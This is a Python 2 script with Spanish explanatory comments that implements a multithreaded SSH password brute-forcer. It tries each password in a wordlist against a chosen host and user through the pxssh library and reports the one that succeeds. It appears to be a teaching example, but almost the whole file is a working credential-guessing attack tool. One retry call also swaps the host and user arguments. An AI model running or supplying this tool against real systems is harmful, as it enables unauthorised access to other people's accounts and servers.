# Pxssh es un script especializado en ssh que esta incluido en la libreria
# pxssh. Incorpora las capacidades de dialogo directo con el servidor de ssh
# mediante funciones como login(), logout() o prompt()
import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

# Funcion que se encarga de la conexion. Le pasamos como parametro los datos
# de acceso, usuario, host y password.
def connect(user, host, password, release):
	#print '[+] Datos -> user: ' + user + ', host: ' + host + ', password: ' + password
	global Found
	global Fails
	try:
		# Usamos la clase pxssh para reducir la cantidad de codigo necesario
		# para el dialogo por ssh.
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: ' + password
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5) 
			connect(user, host, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:	
		if release:
			connection_lock.release()

# Funcion principal.
def main():
	# Definimos el mensaje de ayuda
	parser = optparse.OptionParser('usage%prog '+ '-H <target host> -u <user> -F <password list>')
	# Definimos el parametro -H, el nombre de la variable destino, el tipo (string) y el mensaje de ayuda.
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	# Definimos el parametro -F, el nombre de la variable destino, el tipo (string) y el mensaje de ayuda.
	parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
	# Definimos el parametro -u, el nombre de la variable destino, el tipo (string) y el mensaje de ayuda.
	parser.add_option('-u', dest='user', type='string', help='specify the user')
	# Parseamos los datos de entrada.
	(options, args) = parser.parse_args()
	# Recuperamos los parametros de entrada
	host = options.tgtHost
	passwdFile = options.passwdFile
	user = options.user
	# Si alguno de los parametros no existe, mostramos el mensaje de uso del 
	# programa y salimos del mismo.
	if host == None or passwdFile == None or user == None:
		print parser.usage
		exit(0)
	print '[+] Traying to determne password: ' + user + '@' + host
	# Abrimos el fichero de diccionario. En cada linea tendremos un password a 
	# probar
	fn = open(passwdFile, 'r')
	# Recorremos las lineas del fichero de diccionario que contiene los passwords
	# a probar. Para cada uno de ellos intentaremos determinar si es el adecuado
	# probando a establecer una conexion con el servidor.
	for line in fn.readlines():
		# Si hemos encontrado el password, lo mostramos por pantalla.
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
		# Si superamos el numero de intentos de conexion con el socket, 
		# mostramos el error y salimos del programa.
		if Fails > 5:
			print "[!] Exiting: Too Many Socket Timeouts"
			exit(0)
		# Recuperamos el semaforo.
		connection_lock.acquire()
		# Leemos el password actual.
		password = line.strip('\r').strip('\n')
		# Mostramos por pantalla el password que vamos a probar.
		print "[-] Testing: "+str(password)
		# Creamos un thread con todos los datos de la prueba.
		t = Thread(target=connect, args=(user, host, password, True))
		# Lanzamos la ejecucion del thread.
		child = t.start()

if __name__ == '__main__':
	main()